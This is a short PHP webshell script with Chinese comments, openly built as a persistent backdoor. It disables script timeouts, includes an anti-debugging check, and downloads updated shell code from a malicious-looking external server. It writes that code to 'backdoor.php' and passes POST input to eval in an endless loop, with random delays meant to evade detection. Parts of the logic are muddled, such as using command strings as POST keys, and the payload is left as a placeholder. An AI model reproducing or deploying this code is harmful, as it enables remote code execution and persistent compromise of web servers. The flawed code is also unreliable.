<?php
ignore_user_abort(true);  // 防止脚本被中断
set_time_limit(0);        // 取消脚本执行时间限制

// 反调试机制，防止被调试器监控
if (function_exists('getmypid') && getmypid() == 1) {
    exit;  // 防止被调试器或自动化工具运行
}

// Webshell文件名称和外部服务器用于更新的URL
$file = 'backdoor.php';
$server_url = 'http://malicious-server.com/shell-update.php';  // 可被用来获取更新后的Webshell

// 初始化Webshell代码
$encoded_code = '...';  // 动态生成或通过加密的代码
$decode_function = function($encoded_code) {
    return base64_decode($encoded_code);  // 更复杂的解码可以在此扩展
};

// 使用动态加载并执行Webshell代码
while (true) {
    // 如果Webshell文件不存在，或需要更新
    if (!file_exists($file) || (time() % 600 == 0)) {
        $shell_code = file_get_contents($server_url); // 从外部获取Webshell代码
        if ($shell_code) {
            file_put_contents($file, $decode_function($shell_code));  // 动态写入更新后的Webshell
        }
    }

    // 随机执行命令，避免被自动检测
    if (rand(0, 1) == 0) {
        $command = 'whoami';
    } else {
        $command = 'ls -la';
    }

    // 执行命令
    @eval($_POST[$command]);

    // 休眠，防止过于频繁的检测
    sleep(rand(5, 15));
}
?>
